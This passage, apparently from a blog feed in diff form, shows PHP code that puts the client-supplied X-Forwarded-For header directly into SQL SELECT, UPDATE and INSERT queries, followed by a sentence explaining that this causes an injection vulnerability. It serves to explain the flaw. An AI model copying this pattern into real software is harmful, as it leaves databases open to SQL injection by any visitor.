-</span><span class='line'>  <span class="nv">$ip</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REMOTE_ADDR&#39;</span><span class="p">];</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_X_FORWARDED_FOR&#39;</span><span class="p">]))</span> <span class="p">{</span>
-</span><span class='line'>    <span class="nv">$ip</span><span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_X_FORWARDED_FOR&#39;</span><span class="p">];</span>
-</span><span class='line'>  <span class="p">}</span>
-</span><span class='line'>  <span class="nv">$results</span><span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="s2">&quot;SELECT * FROM stats where ip=&#39;&quot;</span><span class="o">.</span><span class="nv">$ip</span><span class="o">.</span><span class="s2">&quot;&#39;&quot;</span><span class="p">);</span>
-</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="nv">$results</span><span class="p">)</span> <span class="p">{</span>
-</span><span class='line'>      <span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_assoc</span><span class="p">(</span><span class="nv">$results</span><span class="p">);</span>
-</span><span class='line'>      <span class="k">if</span> <span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;ip&#39;</span><span class="p">])</span>
-</span><span class='line'>        <span class="nb">mysql_query</span><span class="p">(</span><span class="s2">&quot;UPDATE stats set count=count+1 where ip=&#39;&quot;</span><span class="o">.</span><span class="nv">$ip</span><span class="o">.</span><span class="s2">&quot;&#39;&quot;</span><span class="p">);</span>
-</span><span class='line'>      <span class="k">else</span>
-</span><span class='line'>        <span class="nb">mysql_query</span><span class="p">(</span><span class="s2">&quot;INSERT INTO stats (ip, count) VALUES (&#39;&quot;</span><span class="o">.</span><span class="nv">$ip</span><span class="o">.</span><span class="s2">&quot;&#39;,1);&quot;</span><span class="p">);</span>
-</span><span class='line'>  <span class="p">}</span>
-</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>As we can see above, there is no input validation or filter against the value of &ldquo;<font color='red'>HTTP_X_FORWARDED_FOR</font>&rdquo; which is saved in variable &ldquo;ip&rdquo; and used in SQL statement directly to make the vulnerability happened.</p>
 ]]></content>
   </entry>
   
